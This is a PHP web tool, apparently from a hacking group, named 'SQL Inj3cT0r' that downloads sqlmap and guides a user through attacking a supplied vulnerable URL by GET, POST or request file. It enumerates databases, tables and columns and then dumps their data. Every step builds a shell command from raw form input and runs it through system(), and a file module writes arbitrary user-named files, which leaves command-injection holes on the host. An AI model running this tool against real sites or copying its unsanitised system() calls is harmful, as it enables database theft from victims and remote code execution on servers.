<?php 
session_start();
set_time_limit(0);
error_reporting(0);
function data($url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
    curl_setopt($ch, CURLOPT_HEADER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_REFERER, $url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}
$head = '
<html>
<head>
</script>
<title>--==[[SQL Inj3cT0r By Incredible]]==--</title>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<STYLE>
body {
font-family: Tahoma;
color: white;
font-size: 17px;
background: black;
}
tr {
BORDER: dashed 1px #333;
color: #FFF;
}
td {
BORDER: dashed 1px #333;
color: #FFF;
}
table {
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
BACKGROUND-COLOR: Black;
color: #FFF;
border-collapse: collapse;
border-spacing: 0px;
}
input {
border : solid 3px ;
border-color : #333;
BACKGROUND-COLOR: white;
font: 11pt Verdana;
color: #333;
}
select {
BORDER-RIGHT: Black 1px solid;
BORDER-TOP: #DF0000 1px solid;
BORDER-LEFT: #DF0000 1px solid;
BORDER-BOTTOM: Black 1px solid;
BORDER-color: #FFF;
BACKGROUND-COLOR: Black;
font: 8pt Verdana;
color: Red;
}
submit {
BORDER: buttonhighlight 2px outset;
BACKGROUND-COLOR: Black;
width: 30%;
color: #FFF;
}
textarea {
border : dashed 1px #333;
BACKGROUND-COLOR: #444444;
font: Fixedsys bold;
color: white;
}
.main {
margin : -287px 0px 0px -490px;
BORDER: dashed 1px #333;
BORDER-COLOR: #333333;
}
.tt {
background-color: Black;
}
A:link {
COLOR: White; TEXT-DECORATION: none
}
A:visited {
COLOR: White; TEXT-DECORATION: none
}
A:hover {
color: Red; TEXT-DECORATION: none
}
A:active {
color: Red; TEXT-DECORATION: none
}
div#left {
    width: 50%;
    height: 20%;
    float: left;
	color: white;
}
div#right {    
    width: 50%;
    height: 20%;
	float: right;
	color: white;
}
div#rest {
	width: 100%;	
	float:bottom;
}
form{ 
margin: 0px; 
padding: 0px; 
} 
#unset_all{
position: fixed;
top: 0px;
color: white;
font-Asize: 50px;right:0px;clip:_top:expression(document.documentElement.scrollTop+document.documentElement.clientHeight-this.clientHeight);_left:expression(document.documentElement.scrollLeft + document.documentElement.clientWidth - offsetWidth);
}
</STYLE>
'; ?>
<html>
<head>
<?php
echo $head ;
echo '
<table width="100%" cellspacing="0" cellpadding="0" class="tb1" >
<td width="100%" align=center valign="top" rowspan="1">
<font color=#ff9933 size=5 face="comic sans ms"><b>--==[[ SQL </font><font color=white size=5 face="comic sans ms"><b> InJeCt0r </font><font color=green size=5 face="comic sans ms"><b>]]==--</font> <div class="hedr">
<td height="10" align="left" class="td1"></td></tr><tr><td
width="100%" align="center" valign="top" rowspan="1"><font
color="red" face="comic sans ms"size="1"><b>
<font color=#ff9933>
####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font><br><font size=3 color=#ff9933 face="comic sans ms">
Greetz to : <br><font size=2 color=white face="comic sans ms">Code Breaker ICA , 1046 ^_^ and Team IndiShell </font><br>
<br></font>
<b>
<font color=#ff9933>
####################################################</font><font color=white>#####################################################</font><font color=green>####################################################</font>
</table>
</table> 
<div align=center>
';
	//-------------------SQLmap path reset module starts----------------------------------//
echo '<div id="unset_all">
		<form method=post style="margin:0px 0px 0px 0px;"><input type=submit style="background-color:red;" name=out value="Reset SQLMAP path"></form></div></span>';
if(isset($_POST['out']))
	{
		unset($_SESSION['sqlmap_path']);
		unset($_SESSION['launch']);
	}
	//-------------------SQLmap path reset module ends----------------------------------//
	
	//-------------------SQLmap download module starts----------------------------------//
if(!is_dir('sqlmap') && !is_file('sqlmap/sqlmap.py'))
{
echo '</head>
		<body>
		<div align=center>
		<form method=post>
			<p>Click "Download" button to download sqlmap </p>
			<input type=submit name=download value="Download SQLMap">
		</form>
		<hr>
		';	
}
	if(isset($_POST['download']))
		{
			if(is_file('sqlmap/sqlmap.py'))
				{
					echo "<script>alert('sqlmap already exists in current directory :P');</script>";
				}
				else
				{
					$tmp=data("https://github.com/sqlmapproject/sqlmap/archive/master.zip");
					file_put_contents("sqlmap.zip",$tmp);
					echo "Unpacking SQLMAP<br>";
					$zip = new ZipArchive;
					if ($zip->open('sqlmap.zip') == TRUE)
						{
							$zip->extractTo(getcwd());
							$zip->close();
						}
						$loc=rename("sqlmap-master","sqlmap");
					if($loc)
					{
						echo 'SQLMap is under this directory --><font color="red"> '.getcwd().'\sqlmap</font>';
					}
				}
		}
//-------------------SQLmap download module ends----------------------------------//

//-------------------set SQLmap location module starts----------------------------------//	
if(isset($_POST['set_path']))
					{
						if(!empty($_POST['sqlmap_path']))
						{
							$_SESSION['sqlmap_path']=trim($_POST['sqlmap_path']);
							$_SESSION['launch']=1;	
							echo 'location of sqlmap has been set!! Proceed to exploitation';
						}
						else
						{
							echo '<script>alert("Please specify sqlmap location");</script>';
						}
					}	
		 if($_SESSION['launch']=='')
			{
				echo '<br><form method=post>
						<p>SQL Injector needs sqlmap location to proceed.Please set sqlmap location in below input box</p>
						<input type=text name=sqlmap_path value="">&nbsp;<input type=submit name=set_path value="Set"></form>';
			}
	//-----------------------------SQL_Injector home menu------------------------//
	echo '<div id="rest" align=center>';			
			if($_SESSION['launch']=='1')
				{					 
				echo '<hr>
					-- Select your method for exploitation --<br>
					<form method=post>
					<input type=submit name=via_get value="GET Method">
					<input type=submit name=via_post value="POST Method">
					<input type=submit name=gen_file value="Generate file">
					<input type=submit name=viafile value="Inject using file">					
					</form>
					--------------------------------------------------------------------------------------<br>';
//------------------------------------------------GET METHOD STARTS------------------------------------------------------//
if(isset($_POST['via_get']))
				{
					echo '
					<form method=post >
					<div align=center>
					<div>You are in "Inject via GET method" block</div><br>
					<table>
					<tr>
					<td>Vulnerable URL</td><td>&nbsp  : &nbsp </td><td><input type=text name=viaget_vulurl value=""></td></tr>
					<tr><td>Set level</td>
					<td>&nbsp; : &nbsp;</td>
					<td><select name="viaget_level">
					  <option value="">Select</option>
					  <option value="1">1</option>
					  <option value="2">2</option>
					  <option value="3">3</option>
					  <option value="4">4</option>
					  <option value="5">5</option>
					</select></td></tr>
					<tr>
					<td>Set risk</td>
					<td>&nbsp; : &nbsp;</td>
					<td><select name="viaget_risk">
					  <option value="">Select</option>
					  <option value="1">1</option>
					  <option value="2">2</option> 
					  <option value="3">3</option>
					</select></td></tr>
					<tr><td>Choose Technique</td>
					<td>&nbsp; : &nbsp;</td>
					<td><select name="viaget_technique">
					  <option value="">Select</option>
					  <option value="U">UNION query SQLi</option>
					  <option value="E">Error-based SQLi</option>
					  <option value="B">Boolean-based blind SQLi</option>
					  <option value="T">Time-based blind SQLi</option>
					  <option value="S">Stacked queries SQLi</option>
					</select></td></tr>
					</table><br>
					<input type=submit name=viaget_extractdb value="Exploit"><br>
					</form>';					
				}
///////////////////
//////post_file end
//////////////////				

	if(isset($_POST['viaget_extractdb']))
					{
							if(!empty($_POST['viaget_vulurl']))
							{	
								
								$viaget_vulurl=trim($_POST['viaget_vulurl']);
								$viaget_level=trim($_POST['viaget_level']);
								$viaget_risk=trim($_POST['viaget_risk']);
								$viaget_technique=trim($_POST['viaget_technique']);
								if(empty($viaget_technique))
											{
											$viaget_technique='BEUSTQ';	
											}
								if(empty($viaget_level))
											{
											$viaget_level='1';	
											}
								if(empty($viaget_risk))
											{
											$viaget_risk='1';		
											}
								$viaget_getdb=" python  ".$_SESSION['sqlmap_path']."  -u ".$viaget_vulurl." --level ".$viaget_level." --risk ".$viaget_risk." --technique ".$viaget_technique." --batch --dbs";
								?>
								<textarea rows=15 cols=100>
								<?php system($viaget_getdb); ?>
								</textarea><br>
								Database names have been printed..!!<br><br>Proceed to extract tables name..
								<br>
								<form method=post>
								<table>
								<tr><td>File</td><td>&nbsp; : &nbsp; </td><td><input type=text name=viaget_tvulurl value="<?php echo $viaget_vulurl; ?>"> </td></tr>
								<tr><td>DB name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=viaget_dbname value=""> </td></tr>
								</table><br>
								<input type=hidden name=viaget_ttechnique value="<?php echo $viaget_technique; ?>">
									<input type=hidden name=viaget_tlevel value="<?php echo $viaget_level; ?>" >
									<input type=hidden name=viaget_trisk value="<?php echo $viaget_risk; ?>">
								<br>
								<input type=submit name=viaget_extracttable value="Extract tables">
								<br>
								<?php 
							}
							else
							{
								echo "<script>alert('Give me Vulnerable URL first!!!  :P');</script>";
							}
					}		
///////////////////
//////extract db ends here
//////////////////						
				if(isset($_POST['viaget_extracttable']))
					{
							if(!empty($_POST['viaget_dbname']))
									{
									$viaget_tvulurl=$_POST['viaget_tvulurl'];
									$viaget_dbname=$_POST['viaget_dbname'];
									$viaget_tlevel=$_POST['viaget_tlevel'];
									$viaget_trisk=$_POST['viaget_trisk'];
									$viaget_ttechnique=$_POST['viaget_ttechnique'];
									$viaget_gettable=" python ".$_SESSION['sqlmap_path']." -u ".$viaget_tvulurl." --level ".$viaget_tlevel." --risk ".$viaget_trisk." --technique ".$viaget_ttechnique." --batch -D ".$viaget_dbname." --tables --hex ";	
									?>
									<textarea rows=15 cols=100>
									<?php system($viaget_gettable); ?>
									</textarea><br>
									Table names from database <b>" <?php echo $viaget_dbname; ?> "</b>have been printed..!!<br><br>Proceed to extract columns name..
									<form method=post>
									<table>
									<tr><td>Vulnerable URL</td><td>&nbsp; : &nbsp; </td><td><input type=text name=viaget_cvulurl value="<?php echo $viaget_tvulurl; ?>"> </td></tr>
									<tr><td>DB name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=viaget_cdbname value="<?php echo $viaget_dbname; ?>"> </td></tr>
									<tr><td>Table name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=viaget_ctablename value=""> </td></tr></table><br>
									<input type=hidden name=viaget_ctechnique value="<?php echo $viaget_ttechnique; ?>">
										<input type=hidden name=viaget_clevel value="<?php echo $viaget_tlevel; ?>" >
										<input type=hidden name=viaget_crisk value="<?php echo $viaget_trisk; ?>">
										<input type=submit name=viaget_extractcolumn value="Extract Columns">
									</form>
									<?php
									}
							else
								{
									echo "<script>alert('DB name is not given... please specify one...');</script>";
									echo "<a href='javascript: window.history.go(-1)'>Extract Table</a>";
								}
					}				
///////////////////
//////extract table ends here
//////////////////					
				
				if(isset($_POST['viaget_extractcolumn']))
					{
								if(!empty($_POST['viaget_ctablename']))
									{
										$viaget_cvulurl=$_POST['viaget_cvulurl'];
										$viaget_cdbname=$_POST['viaget_cdbname'];
										$viaget_ctablename=$_POST['viaget_ctablename'];
										$viaget_clevel=$_POST['viaget_clevel'];
										$viaget_crisk=$_POST['viaget_crisk'];
										$viaget_ctechnique=$_POST['viaget_ctechnique'];
										$viaget_getcolumn=" python ".$_SESSION['sqlmap_path']." -u ".$viaget_cvulurl." --level ".$viaget_clevel." --risk ".$viaget_crisk." --technique ".$viaget_ctechnique." --batch -D ".$viaget_cdbname." -T ".$viaget_ctablename." --columns --hex ";	
										?>
										<textarea rows=15 cols=100>
										<?php system($viaget_getcolumn); ?>
										</textarea><br>
										Column names from table <b>" <?php echo $viaget_ctablename; ?> "</b> have been printed..!!<br><br>Proceed to dump data from columns..
										<form method=post>
										<table>
										<tr><td>Vulnerable URL</td><td>&nbsp; : &nbsp; </td><td><input type=text name=viaget_dvulurl value="<?php echo $viaget_cvulurl; ?>"></td></tr>
										<tr><td>DB name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=viaget_ddbname value="<?php echo $viaget_cdbname; ?>"></td></tr>
										<tr><td>Table name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=viaget_dtablename value="<?php echo $viaget_ctablename; ?>"> </td></tr>
										<tr><td>Column/s name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=viaget_dcolumnname value="">( Separate with comma: ex. col1,col2,col3..)</td></tr></table><br>
										<input type=hidden name=viaget_dtechnique value="<?php echo $viaget_ctechnique; ?>">
										<input type=hidden name=viaget_dlevel value="<?php echo $viaget_clevel; ?>" >
										<input type=hidden name=viaget_drisk value="<?php echo $viaget_crisk; ?>">							
										<input type=submit name=viaget_dump value="Dump_Data"></form>
										
											<?php
									}
									else
									{
										echo "<script>alert('Table name not given... please specify one...');</script>";
										
									}
					}
///////////////////
//////extract columns end
//////////////////						
			if(isset($_POST['viaget_dump']))
					{
							if(!empty($_POST['viaget_dcolumnname']))
								{
									$viaget_dvulurl=$_POST['viaget_dvulurl'];
									$viaget_ddbname=$_POST['viaget_ddbname'];
									$viaget_dtablename=$_POST['viaget_dtablename'];
									$viaget_dcolumnname=$_POST['viaget_dcolumnname'];
									$viaget_dlevel=$_POST['viaget_dlevel'];
									$viaget_drisk=$_POST['viaget_drisk'];
									$viaget_dtechnique=$_POST['viaget_dtechnique'];
									$viaget_getdata=" python ".$_SESSION['sqlmap_path']." -u ".$viaget_dvulurl." --level ".$viaget_dlevel." --risk ".$viaget_drisk." --technique ".$viaget_dtechnique." --batch -D ".$viaget_ddbname." -T ".$viaget_dtablename." -C " .$viaget_dcolumnname. " --dump --hex";	?>
									<textarea rows=15 cols=100>
									<?php system($viaget_getdata); ?>
									</textarea><br>
									Congratzz..Data from columns <b>" <?php echo $viaget_dcolumnname; ?> "</b> have been printed..!!<br><br>
									<?php 
								}
								else
								{
									echo '<script>alert("Please enter column(s) name to get data");</script>';
								}
					}					
///////////////////
//////data dump  end
//////////////////							
 //------------------------------------------------GET METHOD ENDS----------------------------------------------------------//

//------------------------------------------------POST METHOD STARTS-------------------------------------------------------//		
			if(isset($_POST['via_post']))
				{
					?>
					<form method=post >
					<div align=center>
					<div>You are in "Inject via post method" block</div><br>
					<table>
					<tr>
					<td> Enter URL </td><td>&nbsp; : &nbsp;</td><td><input type=text name=vulurl value=""></td></tr>
					<td> Post parameter data here</td><td>&nbsp; : &nbsp;</td><td><input type=text name=postdata value=""></td></tr>
					<tr><td>Set level</td>
					<td>&nbsp; : &nbsp;</td>
					<td><select name="level">
					  <option value="">Select</option>
					  <option value="1">1</option>
					  <option value="2">2</option>
					  <option value="3">3</option>
					  <option value="4">4</option>
					  <option value="5">5</option>
					</select></td></tr>
					<tr>
					<td>Set risk</td>
					<td>&nbsp; : &nbsp;</td>
					<td><select name="risk">
					  <option value="">Select</option>
					  <option value="1">1</option>
					  <option value="2">2</option> 
					  <option value="3">3</option>
					</select></td></tr>
					<tr><td>Choose Technique</td>
					<td>&nbsp; : &nbsp;</td>
					<td><select name="technique">
					  <option value="">Select</option>
					  <option value="U">UNION query SQLi</option>
					  <option value="E">Error-based SQLi</option>
					  <option value="B">Boolean-based blind SQLi</option>
					  <option value="T">Time-based blind SQLi</option>
					  <option value="S">Stacked queries SQLi</option>
					</select></td></tr>
					</table><br>
					<input type=submit name=extractdb value="Exploit"><br>
					</form>
					<?php
				}
///////////////////
//////post_file end
//////////////////				

	 if(isset($_POST['extractdb']))
			{
					if(!empty($_POST['vulurl']))
					{						
						if(!empty($_POST['postdata']))
							{	
								$vulurl=trim($_POST['vulurl']);
								$postdata=trim($_POST['postdata']);
								$level=trim($_POST['level']);
								$risk=trim($_POST['risk']);
								$technique=trim($_POST['technique']);
								if(empty($technique))
											{
											$technique='BEUSTQ';	
											}
								if(empty($level))
											{
											$level='1';	
											}
								if(empty($risk))
											{
											$risk='1';		
											}
								$getdb=' python '.$_SESSION['sqlmap_path'].' -u '.$vulurl.' --data="'.$postdata.'" --level '.$level.' --risk '.$risk.' --technique '.$technique.' --batch --dbs' ;
								?>
								<textarea rows=15 cols=100>
								<?php system($getdb); ?>
								</textarea><br>
								Database names have been printed..!!<br><br>Proceed to extract tables name..
								<br>
								<form method=post>
								<table>
								<tr><td>Enter URL</td><td>&nbsp; : &nbsp; </td><td><input type=text name=tvulurl value="<?php echo $vulurl; ?>"></td></tr>
								<tr><td>Post parameter data here</td><td>&nbsp; : &nbsp; </td><td><input type=text name=tpostdata value="<?php echo $postdata; ?>"></td></tr>
								<tr><td>DB name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=dbname value=""></td></tr></table><br>
								<input type=hidden name=ttechnique value="<?php echo $technique; ?>">
								<input type=hidden name=tlevel value="<?php echo $level; ?>" >
								<input type=hidden name=trisk value="<?php echo $risk; ?>">								
								<input type=submit name=extracttable value="Extract tables"></form>
								<br>
								<?php 
							}
							else
							{
								echo "<script>alert('Where is postdata???????  :|');</script>";
							}							
					}
					else{
						echo '<script>alert("Please enter vulnerable URL");</script>';
					}
			}
///////////////////
//////extract db ends here
//////////////////						
				if(isset($_POST['extracttable']))
					{
							if(!empty($_POST['dbname']))
									{
									$tvulurl=$_POST['tvulurl'];
									$tpostdata=$_POST['tpostdata'];
									$dbname=$_POST['dbname'];
									$tlevel=$_POST['tlevel'];
									$trisk=$_POST['trisk'];
									$ttechnique=$_POST['ttechnique'];
									$gettable=' python '.$_SESSION['sqlmap_path'].' -u '.$tvulurl.' --data="'.$tpostdata.'" --level '.$tlevel.' --risk '.$trisk.' --technique '.$ttechnique.' --batch  -D '.$dbname.' --tables ';
									?>
									<textarea rows=15 cols=100>
									<?php system($gettable); ?>
									</textarea><br>
									Table names from database <b>" <?php echo $dbname; ?> "</b>have been printed..!!<br><br>Proceed to extract columns name..
									<form method=post>
									<table>
									<tr><td>Enter URL</td><td>&nbsp; : &nbsp; </td><td><input type=text name=cvulurl value="<?php echo $tvulurl; ?>"></td></tr>
									<tr><td>Post parameter data here</td><td>&nbsp; : &nbsp; </td><td><input type=text name=cpostdata value="<?php echo $tpostdata; ?>"></td></tr>
									<tr><td>DB name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=cdbname value="<?php echo $dbname; ?>"> </td></tr>
									<tr><td>Table name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=ctablename value=""> </td></tr></table><br>
									<input type=hidden name=ctechnique value="<?php echo $ttechnique; ?>">
									<input type=hidden name=clevel value="<?php echo $tlevel; ?>" >
									<input type=hidden name=crisk value="<?php echo $trisk; ?>">
									<input type=submit name=extractcolumn value="Extract Columns">
									<br>
									<?php
									}
							else
								{
									echo "<script>alert('DB name is not given... please specify one...');</script>";
									echo "<a href='javascript: window.history.go(-1)'>Extract Table</a>";
								}
					}
				
///////////////////
//////extract table ends here
//////////////////					
				
				if(isset($_POST['extractcolumn']))
					{
								if(!empty($_POST['ctablename']))
									{
										$cvulurl=$_POST['cvulurl'];
										$cpostdata=$_POST['cpostdata'];
										$cdbname=$_POST['cdbname'];
										$ctablename=$_POST['ctablename'];
										$clevel=$_POST['clevel'];
										$crisk=$_POST['crisk'];
										$ctechnique=$_POST['ctechnique'];
										$getcolumn=' python '.$_SESSION['sqlmap_path'].' -u '.$cvulurl.' --data="'.$cpostdata.'" --level '.$clevel.' --risk '.$crisk.' --technique '.$ctechnique.' --batch  -D '.$cdbname.' -T '.$ctablename.' --columns';	?>
										<textarea rows=15 cols=100>
										<?php system($getcolumn); ?>
										</textarea><br>
										Column names from table <b>" <?php echo $ctablename; ?> "</b> have been printed..!!<br><br>Proceed to dump data from columns..
										<form method=post>
										<table>
										<tr><td>Enter URL</td><td>&nbsp; : &nbsp; </td><td><input type=text name=dvulurl value="<?php echo $cvulurl; ?>"></td></tr>
										<tr><td>Post parameter data here</td><td>&nbsp; : &nbsp; </td><td><input type=text name=dpostdata value="<?php echo $cpostdata; ?>"></td></tr>
										<tr><td>DB name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=ddbname value="<?php echo $cdbname; ?>"></td></tr>
										<tr><td>Table name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=dtablename value="<?php echo $ctablename; ?>"> </td></tr>
										<tr><td>Column/s name </td><td>&nbsp; : &nbsp; </td><td><input type=text name=dcolumnname value="">( Separate with comma: ex. col1,col2,col3..)</td></tr></table><br>
										<input type=hidden name=dtechnique value="<?php echo $ctechnique; ?>">
										<input type=hidden name=dlevel value="<?php echo $clevel; ?>" >
										<input type=hidden name=drisk value="<?php echo $crisk; ?>">
										<input type=submit name=dump value="Dump_Data"></form>
										<br>
											<?php
									}
									else
									{
										echo "<script>alert('Table name is not given... please specify one...');</script>";
										
									}
					}
///////////////////
//////extract columns end
//////////////////					
				if(isset($_POST['dump']))
					{
							if(!empty($_POST['dcolumnname']))
							{									
									$dvulurl=$_POST['dvulurl'];
									$dpostdata=$_POST['dpostdata'];
									$ddbname=$_POST['ddbname'];
									$dtablename=$_POST['dtablename'];
									$dcolumnname=$_POST['dcolumnname'];
									$dlevel=$_POST['dlevel'];
									$drisk=$_POST['drisk'];
									$dtechnique=$_POST['dtechnique'];
									$getdata=' python '.$_SESSION['sqlmap_path'].' -u '.$dvulurl.' --data="'.$dpostdata.'" --level '.$dlevel.' --risk '.$drisk.' --technique '.$dtechnique.' --batch  -D '.$ddbname.' -T '.$dtablename.' -C '.$dcolumnname.' --dump '; ?>
									<textarea rows=15 cols=100>
									<?php system($getdata); ?>
									</textarea><br>
									Congratzz..Data from columns <b>" <?php echo $dcolumnname; ?> "</b> have been printed..!!<br><br>
									<?php 
							}
							else{
								echo '<script>alert("Please enter column(s) name to get data");</script>';
							}
					}					
///////////////////
//////data dump  end
//////////////////		
//------------------------------------------------POST METHOD ENDS-----------------------------------------------------------

//------------------------------------------------FILE GENERATING MODULE STARTS--------------------------------------------------
	 if(isset($_POST['gen_file']))
		{
			echo '<form method=post><div>You are in " File Generating " block</div><br>
					
			Give me a name for file &nbsp:&nbsp <input type=text name=file_name value="data.txt">
			<br><br>
			<br>--Paste post data content here-- <br> <textarea rows=15 cols=60 name=content></textarea><br>
			<br><input type=submit name=generate_file value="Generate File"></form>';
		}
	if(isset($_POST['generate_file']))
				{
						$filename=$_POST['file_name'];
						$content=$_POST['content'];
						if(!empty($filename) || !empty($content))
						{
							$file=fopen($filename,'w');
							fwrite($file,$content);
							fclose($file);
							echo "File has been generated in current directory.<br>You can proceed using this file";						
						}
						else
						{
							echo "<script>alert('Please provide filename/content');</script>";
						}
				}
//------------------------------------------------FILE GENERATING MODULE ENDS--------------------------------------------------

 //------------------------------------------------INJECT VIA FILE STARTS------------------------------------------------------		
 if(isset($_POST['viafile']))
				{
					?>
					<form method=post >
					<div align=center>
					<div>You are in "Inject via file" block</div><br>
					<table>
					<tr>
					<td>Enter file name</td><td>&nbsp : &nbsp</td><td><input type=text name=viafile_filename value=""></td></tr>
					<tr><td>Set level</td>
					<td>&nbsp : &nbsp</td>
					<td><select name="viafile_level">
					  <option value="">Select</option>
					  <option value="1">1</option>
					  <option value="2">2</option>
					  <option value="3">3</option>
					  <option value="4">4</option>
					  <option value="5">5</option>
					</select></td></tr>
					<tr>
					<td>Set risk</td>
					<td>&nbsp : &nbsp</td>
					<td><select name="viafile_risk">
					  <option value="">Select</option>
					  <option value="1">1</option>
					  <option value="2">2</option> 
					  <option value="3">3</option>
					</select></td></tr>
					<tr><td>Choose Technique</td>
					<td>&nbsp : &nbsp</td>
					<td><select name="viafile_technique">
					  <option value="">Select</option>
					  <option value="U">UNION query SQLi</option>
					  <option value="E">Error-based SQLi</option>
					  <option value="B">Boolean-based blind SQLi</option>
					  <option value="T">Time-based blind SQLi</option>
					  <option value="S">Stacked queries SQLi</option>
					</select></td></tr>
					</table><br>
					<input type=submit name=viafile_extractdb value="Exploit"><br>
					</form>
					<?php
				}
///////////////////
//////post_file end
//////////////////				

		if(isset($_POST['viafile_extractdb']))
					{
							if(!empty($_POST['viafile_filename']))
							{	
								
								$viafile_filename=trim($_POST['viafile_filename']);
								$viafile_level=trim($_POST['viafile_level']);
								$viafile_risk=trim($_POST['viafile_risk']);
								$viafile_technique=trim($_POST['viafile_technique']);
								if(empty($viafile_technique))
											{
											$viafile_technique='BEUSTQ';	
											}
								if(empty($viafile_level))
											{
											$viafile_level='1';	
											}
								if(empty($viafile_risk))
											{
											$viafile_risk='1';		
											}
								$viafile_getdb=" python ".$_SESSION['sqlmap_path']." -r ".$viafile_filename." --level ".$viafile_level." --risk ".$viafile_risk." --technique ".$viafile_technique." --batch --dbs" ;
								?>
								<textarea rows=15 cols=100>
								<?php system($viafile_getdb); ?>
								</textarea><br>
								Database names have been printed..!!<br><br>Proceed to extract tables name..
								<br>
								<form method=post>
								<table>
								<tr><td>File</td><td>&nbsp : &nbsp </td><td><input type=text name=viafile_tfilename value="<?php echo $viafile_filename; ?>"> </td></tr>
								<tr><td>DB name </td><td>&nbsp : &nbsp </td><td><input type=text name=viafile_dbname value=""> </td></tr>
								<input type=hidden name=viafile_ttechnique value="<?php echo $viafile_technique; ?>"></td>
									<td><input type=hidden name=viafile_tlevel value="<?php echo $viafile_level; ?>" ></td>
									<td><input type=hidden name=viafile_trisk value="<?php echo $viafile_risk; ?>"></td>
								</tr></table><br>
								<input type=submit name=viafile_extracttable value="Extract tables">
								<br>
								<?php 
							}
							else
							{
								echo "<script>alert('Where is filename???????  :|');</script>";
							}
							
					}		
///////////////////
//////extract db ends here
//////////////////						
				if(isset($_POST['viafile_extracttable']))
					{
							if(!empty($_POST['viafile_dbname']))
									{
									$viafile_tfilename=$_POST['viafile_tfilename'];
									$viafile_dbname=$_POST['viafile_dbname'];
									$viafile_tlevel=$_POST['viafile_tlevel'];
									$viafile_trisk=$_POST['viafile_trisk'];
									$viafile_ttechnique=$_POST['viafile_ttechnique'];
									$viafile_gettable=" python ".$_SESSION['sqlmap_path']." -r ".$viafile_tfilename." --level ".$viafile_tlevel." --risk ".$viafile_trisk." --technique ".$viafile_ttechnique." --batch -D ".$viafile_dbname." --tables ";	
									?>
									<textarea rows=15 cols=100>
									<?php system($viafile_gettable); ?>
									</textarea><br>
									Table names from database <b>" <?php echo $viafile_dbname; ?> "</b>have been printed..!!<br><br>Proceed to extract columns name..
									<form method=post>
									<table>
									<tr><td>File</td><td>&nbsp : &nbsp </td><td><input type=text name=viafile_cfilename value="<?php echo $viafile_tfilename; ?>"> </td></tr>
									<tr><td>DB name </td><td>&nbsp : &nbsp </td><td><input type=text name=viafile_cdbname value="<?php echo $viafile_dbname; ?>"> </td></tr>
									<tr><td>Table name </td><td>&nbsp : &nbsp </td><td><input type=text name=viafile_ctablename value=""> </td></tr>
									<tr><td><input type=hidden name=viafile_ctechnique value="<?php echo $viafile_ttechnique; ?>"></td>
										<td><input type=hidden name=viafile_clevel value="<?php echo $viafile_tlevel; ?>" ></td>
										<td><input type=hidden name=viafile_crisk value="<?php echo $viafile_trisk; ?>"></td>
									</tr></table><br>
									<input type=submit name=viafile_extractcolumn value="Extract Columns">
									<br>
									<?php
									}
							else
								{
									echo "<script>alert('DB name is not given... please specify one...');</script>";
									echo "<a href='javascript: window.history.go(-1)'>Extract Table</a>";
								}
					}
///////////////////
//////extract table ends here
//////////////////
				if(isset($_POST['viafile_extractcolumn']))
					{
								if(!empty($_POST['viafile_ctablename']))
									{
										$viafile_cfilename=$_POST['viafile_cfilename'];
										$viafile_cdbname=$_POST['viafile_cdbname'];
										$viafile_ctablename=$_POST['viafile_ctablename'];
										$viafile_clevel=$_POST['viafile_clevel'];
										$viafile_crisk=$_POST['viafile_crisk'];
										$viafile_ctechnique=$_POST['viafile_ctechnique'];
										$viafile_getcolumn=" python ".$_SESSION['sqlmap_path']." -r ".$viafile_cfilename." --level ".$viafile_clevel." --risk ".$viafile_crisk." --technique ".$viafile_ctechnique." --batch -D ".$viafile_cdbname." -T ".$viafile_ctablename." --columns ";	
										?>
										<textarea rows=15 cols=100>
										<?php system($viafile_getcolumn); ?>
										</textarea><br>
										Column names from table <b>" <?php echo $viafile_ctablename; ?> "</b> have been printed..!!<br><br>Proceed to dump data from columns..
										<form method=post>
										<table>
										<tr><td>File</td><td>&nbsp : &nbsp </td><td><input type=text name=viafile_dfilename value="<?php echo $viafile_cfilename; ?>"></td></tr>
										<tr><td>DB name </td><td>&nbsp : &nbsp </td><td><input type=text name=viafile_ddbname value="<?php echo $viafile_cdbname; ?>"></td></tr>
										<tr><td>Table name </td><td>&nbsp : &nbsp </td><td><input type=text name=viafile_dtablename value="<?php echo $viafile_ctablename; ?>"> </td></tr>
										<tr><td>Column/s name </td><td>&nbsp : &nbsp </td><td><input type=text name=viafile_dcolumnname value="">( Separate with comma: ex. col1,col2,col3..)</td></tr>
										<tr><td><input type=hidden name=viafile_dtechnique value="<?php echo $viafile_ctechnique; ?>"></td>
										<td><input type=hidden name=viafile_dlevel value="<?php echo $viafile_clevel; ?>" ></td>
										<td><input type=hidden name=viafile_drisk value="<?php echo $viafile_crisk; ?>"></td>
										</tr></table><br>
										<input type=submit name=viafile_dump value="Dump_Data">
										<br>
											<?php
									}
									else
									{
										echo "<script>alert('Table name is not given... please specify one...');</script>";					
									}
					}
///////////////////
//////extract columns end
//////////////////						
				if(isset($_POST['viafile_dump']))
					{
							if(!empty($_POST['viafile_dcolumnname']))
								{
									$viafile_dfilename=$_POST['viafile_dfilename'];
									$viafile_ddbname=$_POST['viafile_ddbname'];
									$viafile_dtablename=$_POST['viafile_dtablename'];
									$viafile_dcolumnname=$_POST['viafile_dcolumnname'];
									$viafile_dlevel=$_POST['viafile_dlevel'];
									$viafile_drisk=$_POST['viafile_drisk'];
									$viafile_dtechnique=$_POST['viafile_dtechnique'];
									$viafile_getdata=" python ".$_SESSION['sqlmap_path']." -r ".$viafile_dfilename." --level ".$viafile_dlevel." --risk ".$viafile_drisk." --technique ".$viafile_dtechnique." --batch -D ".$viafile_ddbname." -T ".$viafile_dtablename." -C " .$viafile_dcolumnname. " --dump ";	?>
									<textarea rows=15 cols=100>
									<?php system($viafile_getdata); ?>
									</textarea><br>
									Congratzz..Data from columns <b>" <?php echo $viafile_dcolumnname; ?> "</b> have been printed..!!<br><br>
